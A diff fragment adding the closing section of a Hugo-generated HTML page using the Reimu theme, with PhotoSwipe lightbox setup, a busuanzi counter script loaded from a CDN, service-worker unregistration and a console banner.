+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
